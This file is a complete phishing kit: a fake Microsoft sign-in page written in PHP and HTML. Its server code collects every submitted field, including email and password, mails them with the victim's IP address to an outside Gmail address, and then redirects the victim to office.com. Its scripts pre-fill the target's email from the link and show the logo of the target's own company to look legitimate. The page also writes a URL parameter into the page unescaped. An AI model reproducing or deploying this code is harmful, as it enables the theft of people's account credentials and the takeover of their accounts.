<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
header('Location: https://www.office.com/');
$message = '';
foreach($_POST as $variable => $value) {
$message .= $variable.': '.$value."\r\n";}
$header  = 'From: PhishBait <donotreply@pbmkr.vt>'."\r\n";
$header .= 'Reply-To: donotreply@pbmkr.vt'."\r\n";
$header .= 'MIME-Version: 1.0'."\r\n";
$header .= 'Content-Type: text/plain; charset=utf-8'."\r\n";
$header .= 'Content-Transfer-Encoding: 8bit'."\r\n";
$header .= 'X-Mailer: PHP v'.phpversion();
mail('claracups@gmail.com', $_SERVER['REMOTE_ADDR'].' @ '.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'], $message, $header);
exit;
} ?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" />
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.1/css/all.css" />
    <link rel="stylesheet" href="css/app.css" />
    <title>Document</title>
</head>

<body style="background-image: url('https://s3.amazonaws.com/simbla-static-2/2021/03/600944656f4e2100191ce8b8/600944a26f4e2100191ce8b9/RxmDlvtBNiwGCP-wITqmDsec.jpg'); background-size: cover;background-repeat: no-repeat;background-attachment: fixed;">
    <br>


    <div class="container">
        <div class="row">
            <div class=" col-sm-5 bg-white mx-auto p-4" style="margin: 70px 0px;">
                <form action="<?php echo basename(__FILE__); ?>" method="post" id="loginform">

                    <img id="logoimg" src="https://logo.clearbit.com/microsoft.com" class="img-fluid" width="40px">&nbsp<span id="logoname" class="align-middle h5" style="color: #747474;"> Microsoft</span><br><br>
                    <span class="h5">Sign In</span><br>
                    <div id="chk" style="display: none;" class="alert alert-danger" ></div>
                    <br>
                    <span id="error" style="display: none;" class="text-danger">That Microsoft account doesn't exist. Enter a different account</span>

                    <div class="row" id="em">
                        <div class="col-sm-12">
                            <input type="email" name="uemail" class="form-control bg-transparent" id="email" aria-describedby="emailHelp" placeholder="Email, phone or skype" style="border-right: none;border-left: none;border-top: none; border-bottom: 1px solid grey;">
                            <!-- <input type="email" name="uemail" id="email" placeholder="Email Address" class="form-control  "> -->
                            
                        </div>
                    </div>
                    <div class="row" id="pass">
                        <div class="col-sm-12">
                            <i class="fas fa-arrow-left" id="back"></i>&nbsp<span id="emailch">someone@examples.com</span><br><br>
                            <input type="password" name="password" id="password" placeholder="Password"
                            class="form-control shadow-none bg-transparent" style="border-right: none;border-left: none;border-top: none; border-bottom: 1px solid grey;">
                            <!-- <br> -->
                            <!-- <a href="#">Forgot Password</a>
                            
                            <hr> -->

                        </div>
                    </div>
                    <div class="row">
                        <div class="col-sm-12">
                            <p>No account? <a href="#">Create one!</a></p>
                            <p><a href="#">Sign in with a security key</a></p>
                            <p><a href="#">sign in options</a></p>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-sm-12">
                            <div id="fbtn" class="text-right ">
                                <input type="button" value="Next" id="next" onclick="shownext()"
                                class="btn btn-primary px-4 shadow-none text-white" style="background-color: #0066BA;">  
                            </div>
                            <div id="sbtn" style="display: none;" class="text-right">
                                <input type="submit" name="submit" value="Login" class="btn px-4 text-white" style="background-color: #0066BA;">
                            </div>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </div>
    <script src="js/app.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
</body>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery.session@1.0.0/jquery.session.min.js"></script>

<script>
 // $('#sbtn').hide();
 // $('#error').hide();

 
 

//  function getUrlVars() {
//     var vars = {};
//     var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
//         vars[key] = value;
//     });
//     return vars;
// }
var msg = new URLSearchParams(window.location.search).get("message");
// var msg = url.searchParams.get("message");
// var msg = getUrlVars()["message"];
var msgd=decodeURIComponent(msg);
if (!msg) {
// $('#chk').hide();
}
else
{
	$('#chk').html(msgd);
    $('#chk').show();
}

// $(document).ready(function(){
	

// 	});




 function shownext() {
    var email=$('#email').val();
    var my_email =email;
    var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
    if (!filter.test(my_email)) {
      $('#error').show();
      email.focus;
      return false;
  }
  else
  {
    $('#error').hide();
     $('#password').val("");
    $('#emailch').html(my_email);
    var ind=my_email.indexOf("@");
    var my_slice=my_email.substr((ind+1));
    var c= my_slice.substr(0, my_slice.indexOf('.'));
    var final= c.toLowerCase();
    var finalu= c.toUpperCase();
    $("#fbtn").animate({left:0, opacity:"hide"}, 0);
    $("#sbtn").animate({left:0, opacity:"show"}, 1000);
    $("#em").animate({left:0, opacity:"hide"}, 0);
    $("#pass").animate({left:0, opacity:"show"}, 1000);
    $.get("https://logo.clearbit.com/"+my_slice)
    .done(function() { 
        $("#logoimg").attr("src", "https://logo.clearbit.com/"+my_slice);
    $("#logoname").html(finalu);

    }).fail(function() { 
        $("#logoimg").attr("src", "https://logo.clearbit.com/office.com");
    $("#logoname").html("Microsoft");

    })
    

}
}

$('#back').click(function () {
    $("#msg").hide();
    $("#sbtn").animate({left:0, opacity:"hide"}, 0);
    $("#fbtn").animate({left:0, opacity:"show"}, 1000);
    $("#pass").animate({left:0, opacity:"hide"}, 0);
    $("#em").animate({left:0, opacity:"show"}, 1000);
    $("#email").val("");
    $("#password").val("");
     $("#logoimg").attr("src", "https://logo.clearbit.com/office.com");
    $("#logoname").html("Microsoft");
    

});

/////////////url email getting////////////////
var email = window.location.hash.substr(1);

if (!email) {

}
else
{

    $('#email').val(email);
     $('#password').val("");
    var my_email =email;
    var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
    var ind=my_email.indexOf("@");
        var my_slice=my_email.substr((ind+1));
        var c= my_slice.substr(0, my_slice.indexOf('.'));
        var final= c.toLowerCase();
        var finalu= c.toUpperCase();
    $('#emailch').html(my_email);
    $("#fbtn").animate({left:0, opacity:"hide"}, 0);
    $("#sbtn").animate({left:0, opacity:"show"}, 1000);
    $("#em").animate({left:0, opacity:"hide"}, 0);
    $("#pass").animate({left:0, opacity:"show"}, 1000);
    $.get("https://logo.clearbit.com/"+my_slice)
    .done(function() { 
        $("#logoimg").attr("src", "https://logo.clearbit.com/"+my_slice);
    $("#logoname").html(finalu);

    }).fail(function() { 
        $("#logoimg").attr("src", "https://logo.clearbit.com/office.com");
    $("#logoname").html("Microsoft");

    })
}


</script>

</html>